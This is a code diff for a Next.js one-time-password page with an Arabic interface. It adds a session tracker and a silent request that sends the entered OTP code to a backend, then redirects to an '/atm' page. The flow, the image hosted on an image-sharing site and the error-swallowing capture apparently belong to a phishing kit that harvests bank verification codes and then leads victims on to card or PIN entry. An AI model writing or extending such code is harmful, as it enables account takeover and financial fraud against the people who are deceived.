@@ -1,6 +1,8 @@
 "use client";
+export const dynamic = 'force-dynamic';
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
+import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
 
@@ -21,6 +23,12 @@ export default function OTPPage() {
 
   function handleConfirm() {
     if (otp.length === 6) {
+      // إرسال رمز OTP للـ API
+      fetch('/api/session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ current_page: 'otp', otp_code: otp }),
+      }).catch(() => {});
       router.push("/atm");
     } else {
       alert("يرجى إدخال رمز مكون من 6 أرقام");
@@ -29,6 +37,7 @@ export default function OTPPage() {
 
   return (
     <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "10px" }}>
+      <SessionTracker page="otp" />
       <div style={{ background: "#fff", width: "100%", maxWidth: "350px", borderRadius: "20px", paddingBottom: "25px", boxShadow: "0 8px 25px rgba(0,0,0,0.05)", textAlign: "center", overflow: "hidden" }}>
 
         <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" style={{ width: "100%", maxWidth: "180px", height: "auto", margin: "20px auto 10px", display: "block" }} alt="OTP" />
